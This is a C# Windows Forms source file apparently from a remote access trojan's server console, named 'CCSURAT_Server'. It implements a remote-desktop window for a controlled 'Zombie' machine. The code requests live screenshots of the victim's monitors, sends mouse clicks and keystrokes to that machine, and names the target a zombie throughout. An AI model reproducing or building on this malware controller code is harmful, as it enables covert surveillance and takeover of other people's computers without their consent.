using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;

namespace CCSURAT_Server
{
    public partial class RemoteDesktop : Form
    {
        private Zombie zombie;

        public RemoteDesktop(Zombie zombie)
        {
            InitializeComponent();
            this.zombie = zombie;
            this.Text = zombie.IP + " - " + zombie.computerName + " - Remote Desktop";
        }

        private void singleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GetScreenImage();
        }

        private void RemoteDesktop_Load(object sender, EventArgs e)
        {
            // Set textboxes to the trackbar values
            refreshTextbox.Text = refreshInterval.Value + " ms";
            qualityTextbox.Text = imageQuality.Value + "%";
            sizeTextbox.Text = imageSize.Value + "%";

            // Set the refresh time interval to refresh trackbar value
            refreshTimer.Interval = refreshInterval.Value;
        }

        private void GetScreenImage()
        {
            if (monitorList.Text != string.Empty)
            {
                try
                {
                    // Screenshot is made client-side, then transferred to server.
                    // Screenshot binary data is processed and then placed into the client object.
                    MakeScreenshot();
                    while (zombie.monitors[monitorList.SelectedIndex].getScreenImage() == null)
                    {
                        System.Threading.Thread.Sleep(1);
                        Application.DoEvents();
                    }
                    screenImageBox.Image = zombie.monitors[monitorList.SelectedIndex].getScreenImage();
                    zombie.monitors[monitorList.SelectedIndex].setScreenImage(null);
                }
                catch (Exception ex)
                {

                }
            }
        }

        private void MakeScreenshot()
        {
            // Request a screenshot passing the image quality value, the image resize value and the device name. 
            zombie.SendData("[[SCREENSHOT]]" + imageQuality.Value + "|*|" +
                          Convert.ToDouble(imageSize.Value) / 100 + "|*|" + 
                                                 monitorList.Text + "[[/SCREENSHOT]]");
        }

        private void GetMonitors()
        {
            try
            {
                // Clear monitors list and get all client's monitors.
                zombie.SendData("[[MONITORS]][[/MONITORS]]");
                while (zombie.monitors.Count <= 0)
                {
                    System.Threading.Thread.Sleep(1);
                    Application.DoEvents();
                }
                // For each monitor that was returned, add it to the monitor list.
                foreach (ControlClasses.Monitor m in zombie.monitors)
                    monitorList.Items.Add(m.deviceName());

                // Set selected monitor to the first monitor. I think this would be the primary one.
                monitorList.SelectedIndex = 0;
            }
            catch (Exception ex)
            {
            }
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (monitorList.Text != string.Empty)
            {
                monitorList.Enabled = false;
                refreshTimer.Start();
            }
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            refreshTimer.Stop();
            monitorList.Enabled = true;
        }

        private void refreshInterval_Scroll(object sender, EventArgs e)
        {
            refreshTextbox.Text = refreshInterval.Value + " ms";
            refreshTimer.Interval = refreshInterval.Value;
        }

        private void imageQuality_Scroll(object sender, EventArgs e)
        {
            qualityTextbox.Text = imageQuality.Value + "%"; 
        }

        private void refreshTimer_Tick(object sender, EventArgs e)
        {
            GetScreenImage();
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            sizeTextbox.Text = imageSize.Value + "%";
        }

        private void RemoteDesktop_Shown(object sender, EventArgs e)
        {
            GetMonitors();
        }

        private void pictureBox1_MouseClick(object sender, MouseEventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            if (mouseControlCheckbox.Checked) {
                MouseEventArgs mouse = (MouseEventArgs)e;

                // Calculate the screen mouse click point in relation to the picturebox click point.
                double monitorWidth = zombie.monitors[monitorList.SelectedIndex].getWidth();
                double monitorHeight = zombie.monitors[monitorList.SelectedIndex].getHeight();
                double monitorX = zombie.monitors[monitorList.SelectedIndex].getX();
                double monitorY = zombie.monitors[monitorList.SelectedIndex].getY();

                decimal factorX = (decimal)monitorWidth / screenImageBox.Size.Width;
                decimal factorY = (decimal)monitorHeight / screenImageBox.Size.Height;

                long clickX = Convert.ToInt64(mouse.X * factorX + (decimal)monitorX);
                long clickY = Convert.ToInt64(mouse.Y * factorY + (decimal)monitorY);

                // Send click command at X/Y and the mouse button name.
                zombie.SendData("[[MOUSECLICK]]" + clickX + "|*|" + clickY + "|*|" + mouse.Button.ToString() + "[[/MOUSECLICK]]");
            }
        }

        private void RemoteDesktop_KeyPress(object sender, KeyPressEventArgs e)
        {
        }

        private void RemoteDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (keyboardControlCheckbox.Checked)
            {
                zombie.SendData("[[KEYPRESS]]" + e.KeyCode.GetHashCode() + "[[/KEYPRESS]]");
            }
        }
    }
}
